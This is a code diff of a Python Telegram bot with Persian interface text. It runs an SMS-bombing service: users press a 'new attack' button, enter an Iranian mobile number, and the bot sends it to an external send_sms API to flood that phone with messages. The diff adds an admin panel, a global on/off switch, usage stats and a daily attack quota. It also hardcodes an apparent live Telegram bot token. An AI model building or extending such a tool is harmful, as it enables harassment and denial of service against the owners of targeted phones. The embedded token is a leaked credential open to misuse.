@@ -4,24 +4,23 @@ from telebot import types
 import requests
 import threading
 import time
-import json
 from datetime import datetime
-import os
 
-# ========== تنظیمات ==========
 TOKEN = "8295266586:AAHGlLZC0Ha4-V1AOfsnJUd8xphqrVX5kBs"
 ADMIN_ID = 8226091292
 LIARA_API = "https://top-topye.liara.run/api/send_sms"
 
 bot = telebot.TeleBot(TOKEN)
 
-# ========== متغیرها ==========
 user_states = {}
 active_attacks = {}
 user_daily = {}
 DAILY_LIMIT = 5
+bot_active = True
 
-# ========== توابع ==========
+def is_admin(user_id):
+    return user_id == ADMIN_ID
+
 def check_daily(user_id):
     today = datetime.now().date()
     if user_id in user_daily:
@@ -29,80 +28,114 @@ def check_daily(user_id):
             return user_daily[user_id]['count'] < DAILY_LIMIT
     return True
 
-# ========== هندلرها ==========
+# ========== استارت ==========
 @bot.message_handler(commands=['start'])
 def start(message):
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.add('🚀 حمله جدید', '📊 وضعیت', '⛔ توقف')
-    bot.reply_to(message, "🚀 ربات آماده است!", reply_markup=markup)
-
-@bot.message_handler(func=lambda m: m.text == '🚀 حمله جدید')
-def new_attack(message):
-    if not check_daily(message.chat.id):
-        bot.reply_to(message, "⚠️ محدودیت روزانه تموم شد")
+    global bot_active
+    if not bot_active and not is_admin(message.from_user.id):
+        bot.reply_to(message, "⛔ ربات غیرفعال است")
         return
-    user_states[message.chat.id] = "waiting"
-    bot.reply_to(message, "📱 شماره موبایل رو بفرست (مثلاً 09123456789)")
+
+    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
+    btn1 = types.KeyboardButton('🚀 حمله جدید')
+    btn2 = types.KeyboardButton('📊 وضعیت')
+    btn3 = types.KeyboardButton('⛔ توقف')
+    
+    if is_admin(message.from_user.id):
+        btn4 = types.KeyboardButton('👑 پنل ادمین')
+        markup.add(btn1, btn2, btn3, btn4)
+    else:
+        markup.add(btn1, btn2, btn3)
+    
+    bot.reply_to(message, "ربات آماده است!", reply_markup=markup)
+
+# ========== پنل ادمین ==========
+@bot.message_handler(func=lambda m: m.text == '👑 پنل ادمین' and is_admin(m.from_user.id))
+def admin_panel(m):
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add('📊 آمار', '🔴 خاموش', '🟢 روشن', '🔙 برگشت')
+    bot.reply_to(m, "پنل مدیریت:", reply_markup=markup)
+
+@bot.message_handler(func=lambda m: m.text == '📊 آمار' and is_admin(m.from_user.id))
+def admin_stats(m):
+    active = len([x for x in active_attacks.values() if x])
+    total = len(user_daily)
+    status = "روشن" if bot_active else "خاموش"
+    bot.reply_to(m, f"📊 آمار:\nوضعیت: {status}\nکاربران: {total}\nحملات فعال: {active}")
+
+@bot.message_handler(func=lambda m: m.text == '🔴 خاموش' and is_admin(m.from_user.id))
+def admin_off(m):
+    global bot_active
+    bot_active = False
+    bot.reply_to(m, "🔴 ربات خاموش شد")
+
+@bot.message_handler(func=lambda m: m.text == '🟢 روشن' and is_admin(m.from_user.id))
+def admin_on(m):
+    global bot_active
+    bot_active = True
+    bot.reply_to(m, "🟢 ربات روشن شد")
+
+@bot.message_handler(func=lambda m: m.text == '🔙 برگشت' and is_admin(m.from_user.id))
+def admin_back(m):
+    start(m)
+
+# ========== حمله جدید ==========
+@bot.message_handler(func=lambda m: m.text == '🚀 حمله جدید')
+def new_attack(m):
+    global bot_active
+    if not bot_active and not is_admin(m.from_user.id):
+        bot.reply_to(m, "⛔ ربات غیرفعال است")
+        return
+    if not check_daily(m.chat.id) and not is_admin(m.chat.id):
+        bot.reply_to(m, "⚠️ محدودیت روزانه تموم شد")
+        return
+    user_states[m.chat.id] = "waiting"
+    bot.reply_to(m, "📱 شماره رو بفرست:")
 
 @bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "waiting")
-def get_phone(message):
-    phone = message.text.strip()
+def get_phone(m):
+    phone = m.text.strip()
     if len(phone) != 11 or not phone.startswith('09'):
-        bot.reply_to(message, "❌ شماره نامعتبر")
+        bot.reply_to(m, "❌ شماره نامعتبر")
         return
     
-    del user_states[message.chat.id]
-    active_attacks[message.chat.id] = True
-    bot.reply_to(message, f"✅ در حال اجرا روی شماره {phone}...")
+    del user_states[m.chat.id]
+    active_attacks[m.chat.id] = True
+    bot.reply_to(m, f"✅ شروع شد...")
     
-    threading.Thread(target=run_attack, args=(phone, message.chat.id)).start()
+    threading.Thread(target=run, args=(phone, m.chat.id)).start()
 
-def run_attack(phone, chat_id):
+def run(phone, cid):
     try:
-        response = requests.post(LIARA_API, json={'phone': phone}, timeout=60)
-        if response.status_code == 200:
-            data = response.json()
-            if data.get('success'):
-                result = data.get('result', {})
-                bot.send_message(chat_id, f"✅ حمله انجام شد!\nموفق: {result.get('success', 0)}")
-            else:
-                bot.send_message(chat_id, "❌ خطا در حمله")
+        r = requests.post(LIARA_API, json={'phone': phone}, timeout=30)
+        if r.status_code == 200:
+            bot.send_message(cid, "✅ حمله انجام شد!")
         else:
-            bot.send_message(chat_id, f"❌ خطا: {response.status_code}")
-    except Exception as e:
-        bot.send_message(chat_id, f"❌ خطا: {str(e)}")
+            bot.send_message(cid, "❌ خطا")
+    except:
+        bot.send_message(cid, "❌ خطا")
     finally:
-        if chat_id in active_attacks:
-            del active_attacks[chat_id]
+        if cid in active_attacks:
+            del active_attacks[cid]
 
+# ========== وضعیت ==========
 @bot.message_handler(func=lambda m: m.text == '📊 وضعیت')
-def status(message):
-    if message.chat.id in active_attacks:
-        bot.reply_to(message, "⚠️ حمله در حال انجام")
+def status(m):
+    if m.chat.id in active_attacks:
+        bot.reply_to(m, "⚠️ در حال اجرا")
     else:
-        bot.reply_to(message, "✅ آماده برای حمله جدید")
+        bot.reply_to(m, "✅ آماده")
 
+# ========== توقف ==========
 @bot.message_handler(func=lambda m: m.text == '⛔ توقف')
-def stop(message):
-    if message.chat.id in active_attacks:
-        active_attacks[message.chat.id] = False
-        bot.reply_to(message, "⛔ حمله متوقف شد")
+def stop(m):
+    if m.chat.id in active_attacks:
+        active_attacks[m.chat.id] = False
+        bot.reply_to(m, "⛔ توقف شد")
     else:
-        bot.reply_to(message, "❌ حمله فعالی نیست")
-
-@bot.message_handler(func=lambda m: True)
-def fallback(message):
-    bot.reply_to(message, "⚠️ لطفاً از دکمه‌ها استفاده کن")
+        bot.reply_to(m, "❌ حمله فعالی نیست")
 
 # ========== اجرا ==========
 if __name__ == "__main__":
-    print("🤖 ربات راه‌اندازی شد")
-    print(f"توکن: {TOKEN}")
-    print("در حال گوش دادن به پیام‌ها...")
-    
-    while True:
-        try:
-            bot.infinity_polling()
-        except Exception as e:
-            print(f"خطا: {e}")
-            time.sleep(5)
+    print("ربات با پنل ادمین راه‌اندازی شد")
+    bot.infinity_polling()
